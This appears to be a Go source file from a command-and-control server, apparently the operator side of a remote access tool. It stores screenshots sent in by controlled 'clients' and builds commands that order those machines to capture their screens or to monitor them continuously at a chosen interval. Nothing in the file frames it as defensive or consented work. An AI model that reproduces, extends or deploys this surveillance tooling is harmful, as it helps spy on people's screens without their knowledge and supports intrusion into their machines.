package screenshot

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"sync"

	"gorm.io/gorm"

	"c2/internal/models"
)

// Manager 截图管理器
type Manager struct {
	db          *gorm.DB
	mu          sync.RWMutex
	screenshots map[uint]*models.Screenshot // 最新截图缓存
}

// NewManager 创建截图管理器
func NewManager(db *gorm.DB) *Manager {
	return &Manager{
		db:          db,
		screenshots: make(map[uint]*models.Screenshot),
	}
}

// SaveScreenshot 保存截图
func (m *Manager) SaveScreenshot(clientID uint, width, height int, format string, data []byte) (*models.Screenshot, error) {
	screenshot := &models.Screenshot{
		ClientID: clientID,
		Width:    width,
		Height:   height,
		Format:   format,
		Data:     data,
	}

	if err := m.db.Create(screenshot).Error; err != nil {
		return nil, err
	}

	m.mu.Lock()
	m.screenshots[clientID] = screenshot
	m.mu.Unlock()

	return screenshot, nil
}

// GetLatestScreenshot 获取最新截图
func (m *Manager) GetLatestScreenshot(clientID uint) (*models.Screenshot, error) {
	m.mu.RLock()
	if ss, exists := m.screenshots[clientID]; exists {
		m.mu.RUnlock()
		return ss, nil
	}
	m.mu.RUnlock()

	var screenshot models.Screenshot
	if err := m.db.Where("client_id = ?", clientID).Order("created_at desc").First(&screenshot).Error; err != nil {
		return nil, err
	}

	return &screenshot, nil
}

// GetScreenshots 获取截图列表
func (m *Manager) GetScreenshots(clientID uint, limit int) []models.Screenshot {
	var screenshots []models.Screenshot
	m.db.Where("client_id = ?", clientID).Order("created_at desc").Limit(limit).Find(&screenshots)
	return screenshots
}

// DeleteOldScreenshots 删除旧截图
func (m *Manager) DeleteOldScreenshots(clientID uint, keepCount int) {
	var screenshots []models.Screenshot
	m.db.Where("client_id = ?", clientID).Order("created_at desc").Find(&screenshots)

	if len(screenshots) > keepCount {
		for i := keepCount; i < len(screenshots); i++ {
			m.db.Delete(&screenshots[i])
		}
	}
}

// ScreenshotRequest 截图请求
type ScreenshotRequest struct {
	Type   string `json:"type"`   // screenshot
	Format string `json:"format"` // png/jpeg
	Quality int   `json:"quality"` // 1-100 for jpeg
}

// ScreenshotResponse 截图响应
type ScreenshotResponse struct {
	Type      string `json:"type"`
	Width     int    `json:"width"`
	Height    int    `json:"height"`
	Format    string `json:"format"`
	Data      string `json:"data"`      // base64 encoded
	Timestamp int64  `json:"timestamp"` // 截图时间戳
}

// CreateScreenshotRequest 创建截图请求命令
func CreateScreenshotRequest(format string, quality int) string {
	if format == "" {
		format = "png"
	}
	req := ScreenshotRequest{
		Type:    "screenshot",
		Format:  format,
		Quality: quality,
	}
	data, _ := json.Marshal(req)
	return string(data)
}

// ParseScreenshotResponse 解析截图响应
func ParseScreenshotResponse(data string) (*ScreenshotResponse, error) {
	var resp ScreenshotResponse
	if err := json.Unmarshal([]byte(data), &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

// DecodeScreenshotData 解码截图数据
func DecodeScreenshotData(encoded string) ([]byte, error) {
	return base64.StdEncoding.DecodeString(encoded)
}

// MonitorRequest 监控请求
type MonitorRequest struct {
	Type     string `json:"type"`      // screen_monitor
	Action   string `json:"action"`    // start/stop
	Interval int    `json:"interval"`  // 截图间隔(毫秒)
	Quality  int    `json:"quality"`   // 图片质量
}

// CreateMonitorStartRequest 创建监控开始请求
func CreateMonitorStartRequest(interval, quality int) string {
	req := MonitorRequest{
		Type:     "screen_monitor",
		Action:   "start",
		Interval: interval,
		Quality:  quality,
	}
	data, _ := json.Marshal(req)
	return string(data)
}

// CreateMonitorStopRequest 创建监控停止请求
func CreateMonitorStopRequest() string {
	req := MonitorRequest{
		Type:   "screen_monitor",
		Action: "stop",
	}
	data, _ := json.Marshal(req)
	return string(data)
}

// FormatScreenshotInfo 格式化截图信息
func FormatScreenshotInfo(ss *models.Screenshot) string {
	return fmt.Sprintf("%dx%d %s %s", ss.Width, ss.Height, ss.Format, ss.CreatedAt.Format("2006-01-02 15:04:05"))
}
